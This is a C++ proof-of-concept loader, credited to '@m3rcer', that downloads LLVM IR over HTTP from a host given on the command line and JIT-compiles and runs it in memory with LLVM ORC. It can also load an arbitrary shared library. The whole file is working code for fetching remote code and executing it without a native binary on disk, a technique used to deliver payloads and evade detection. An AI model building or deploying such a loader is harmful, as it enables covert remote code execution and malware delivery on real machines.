/*
Author: @m3rcer
ORCJIT remote HTTP load interpreter POC
*/

#define NOMINMAX
#define WIN32_LEAN_AND_MEAN
#define VC_EXTRALEAN
#define NOGDI
#define NOUSER
#define NOSERVICE
#define NOHELP

#include <windows.h>
#include <winhttp.h>

#include <llvm/ExecutionEngine/Orc/LLJIT.h>
#include <llvm/ExecutionEngine/Orc/ThreadSafeModule.h>
#include <llvm/Support/DynamicLibrary.h>
#include <llvm/Support/InitLLVM.h>
#include <llvm/Support/TargetSelect.h>
#include <llvm/Support/raw_ostream.h>
#include <llvm/Support/SourceMgr.h>
#include <llvm/IRReader/IRReader.h>
#include <llvm/IR/LLVMContext.h>
#include <llvm/IR/Module.h>
#include <llvm/Support/MemoryBuffer.h>

#include <vector>
#include <memory>
#include <string>
#include <iostream>

using namespace llvm;
using namespace llvm::orc;

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> DownloadIR(LPCWSTR host, LPCWSTR path) {
    std::vector<BYTE> buffer;
    HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return buffer;

    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_BYPASS_PROXY_CACHE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    DWORD bytesRead = 0;
    BYTE temp[4096];
    do {
        if (!WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead)) break;
        buffer.insert(buffer.end(), temp, temp + bytesRead);
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

int main(int argc, char **argv) {
    InitLLVM X(argc, argv);
    InitializeNativeTarget();
    InitializeNativeTargetAsmPrinter();
    InitializeNativeTargetAsmParser();

    if (argc < 2) {
        errs() << "Usage:\n  " << argv[0] << " <file.ll | --remoteload host path> [args...] [--load=shared-lib]\n";
        return 1;
    }

    std::string sharedLibPath;
    std::vector<std::string> mainArgs;
    std::unique_ptr<MemoryBuffer> buffer;
    std::unique_ptr<Module> mod;
    LLVMContext* ctx = new LLVMContext();
    SMDiagnostic err;

    if (std::string(argv[1]) == "--remoteload" && argc >= 4) {
        std::wstring host(argv[2], argv[2] + strlen(argv[2]));
        std::wstring path(argv[3], argv[3] + strlen(argv[3]));
        std::vector<BYTE> raw = DownloadIR(host.c_str(), path.c_str());
        buffer = MemoryBuffer::getMemBufferCopy(std::string((char*)raw.data(), raw.size()));
        mod = parseIR(buffer->getMemBufferRef(), err, *ctx);
        for (int i = 4; i < argc; ++i) mainArgs.push_back(argv[i]);
    } else {
        mod = parseIRFile(argv[1], err, *ctx);
        for (int i = 2; i < argc; ++i) {
            std::string arg = argv[i];
            if (arg.rfind("--load=", 0) == 0) {
                sharedLibPath = arg.substr(7);
            } else {
                mainArgs.push_back(arg);
            }
        }
    }

    if (!mod) {
        err.print(argv[0], errs());
        return 1;
    }

    if (!sharedLibPath.empty()) {
        if (sys::DynamicLibrary::LoadLibraryPermanently(sharedLibPath.c_str())) {
            errs() << "Failed to load shared lib: " << sharedLibPath << "\n";
            return 1;
        }
    }

    auto tsm = ThreadSafeModule(std::move(mod), std::unique_ptr<LLVMContext>(ctx));

    auto jitOrErr = LLJITBuilder().create();
    if (!jitOrErr) {
        logAllUnhandledErrors(jitOrErr.takeError(), errs(), "JIT create failed: ");
        return 1;
    }

    auto jit = std::move(*jitOrErr);
    sys::DynamicLibrary::LoadLibraryPermanently(nullptr);

    if (auto err = jit->addIRModule(std::move(tsm))) {
        logAllUnhandledErrors(std::move(err), errs(), "Add module failed: ");
        return 1;
    }

    auto mainSym = jit->lookup("main");
    if (!mainSym) {
        logAllUnhandledErrors(mainSym.takeError(), errs(), "main lookup failed: ");
        return 1;
    }

    using MainFunc = int (*)(int, char**);
    auto mainFn = mainSym->toPtr<MainFunc>();

    std::vector<const char*> argvPtrs;
    for (const auto& arg : mainArgs)
        argvPtrs.push_back(arg.c_str());

    int result = mainFn(static_cast<int>(argvPtrs.size()), const_cast<char**>(argvPtrs.data()));
    outs() << "Result: " << result << "\n";
    return 0;
}
